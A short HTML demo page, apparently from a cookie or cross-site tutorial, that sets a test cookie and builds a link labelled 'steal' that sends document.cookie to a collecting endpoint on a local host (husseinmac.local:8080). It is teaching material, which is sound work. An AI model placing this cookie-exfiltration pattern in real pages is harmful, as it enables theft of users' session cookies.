<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
    <button id = 'btnCreateCookie'>Create Cookie</button>
    <a id = 'aSteal'>steal</a>
    <a href = 'http://example.com'>go to example.com</a>
    <a href = 'http://www.example.com'>go to www.example.com</a>
    <img src = 'http://husseinmac.local:8080/img'>
    <script>
    const btnCreateCookie = document.getElementById("btnCreateCookie")
    btnCreateCookie.addEventListener("click", e=> document.cookie = "hussein=7")
    
    const steal = document.getElementById("aSteal")
    steal.href = `http://husseinmac.local:8080/steal?v=${document.cookie}`
   </script>
</body>
</html>
